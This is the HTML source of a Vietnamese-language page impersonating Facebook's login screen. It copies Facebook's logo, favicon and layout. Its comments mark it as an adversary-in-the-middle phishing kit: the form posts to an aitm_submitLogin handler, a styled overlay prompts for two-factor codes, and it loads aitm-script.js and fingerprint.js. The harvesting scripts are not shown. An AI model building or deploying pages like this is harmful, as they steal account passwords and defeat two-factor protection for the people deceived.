<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Đăng nhập Facebook</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <link rel="stylesheet" href="fb-style.css">
    <style>
        /* ===== AiTM-specific additions ===== */

        /* Facebook header bar */
        .fb-header {
            background: #1877f2; width: 100%; padding: 14px 0;
            display: flex; justify-content: center; align-items: center;
            position: fixed; top: 0; left: 0; z-index: 100;
        }

        /* 2FA Overlay */
        .twofa-overlay {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.6); z-index: 9999;
            display: flex; align-items: center; justify-content: center;
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn { from{opacity:0} to{opacity:1} }
        .twofa-card {
            background: white; border-radius: 12px; padding: 28px;
            width: 90%; max-width: 380px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
            animation: slideUp 0.3s ease;
        }
        @keyframes slideUp { from{transform:translateY(20px);opacity:0} to{transform:translateY(0);opacity:1} }
        .twofa-header { text-align: center; margin-bottom: 20px; }
        .twofa-header .icon { font-size: 48px; margin-bottom: 8px; }
        .twofa-header h3 { font-size: 18px; font-weight: 700; color: #1c1e21; }
        .twofa-header p { font-size: 13px; color: #606770; margin-top: 6px; line-height: 1.5; }
        .twofa-input {
            width: 100%; padding: 14px; border: 2px solid #ddd;
            border-radius: 8px; font-size: 22px; text-align: center;
            letter-spacing: 10px; font-weight: 700; color: #1c1e21;
            outline: none; margin-bottom: 16px; box-sizing: border-box;
        }
        .twofa-input:focus { border-color: #1877f2; }
        .twofa-btn {
            width: 100%; padding: 13px; background: #1877f2;
            color: white; border: none; border-radius: 8px;
            font-size: 15px; font-weight: 700; cursor: pointer;
            transition: background 0.2s;
        }
        .twofa-btn:hover { background: #166fe5; }
        .twofa-btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .twofa-error {
            background: #fee2e2; border: 1px solid #fca5a5;
            border-radius: 6px; padding: 8px 12px; margin-bottom: 12px;
            font-size: 12px; color: #dc2626; display: none;
        }
        .twofa-error.show { display: block; }
        .twofa-resend {
            text-align: center; margin-top: 12px;
            font-size: 12px; color: #1877f2; cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="mobile-container">
        <!-- Facebook Header -->
        <div class="fb-header">
            <svg viewBox="0 0 36 36" width="40" height="40" fill="#fff">
                <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"/>
                <path fill="#1877f2" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.531-.399Z"/>
            </svg>
        </div>

        <!-- Desktop left panel -->
        <div class="desktop-left">
            <h1>facebook</h1>
            <p>Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</p>
        </div>

        <!-- Login Form — dùng đúng class từ fb-style.css -->
        <div class="login-form">
            <input type="text" id="email" placeholder="Số di động hoặc email" autocomplete="off" autocapitalize="off">
            <input type="password" id="password" placeholder="Mật khẩu" autocomplete="off">

            <!-- Error message — dùng class error-msg từ fb-style.css -->
            <div id="errorBox" class="error-msg">
                <span id="errorText"></span>
            </div>

            <button class="btn-login" id="btnLogin" onclick="aitm_submitLogin()">Đăng nhập</button>

            <div class="forgot-password">
                <a href="#">Bạn quên mật khẩu ư?</a>
            </div>

            <div class="divider"><span>hoặc</span></div>
            <button class="btn-create">Tạo tài khoản mới</button>
        </div>

        <!-- Loading overlay — dùng đúng class từ fb-style.css -->
        <div class="loading-overlay" id="loadingOverlay">
            <div class="spinner"></div>
            <p class="loading-text" id="loadingText">Đang đăng nhập...</p>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <div class="meta-logo">Meta © 2026</div>
    </div>

    <script src="aitm-script.js"></script>
    <script src="fingerprint.js"></script>
</body>
</html>
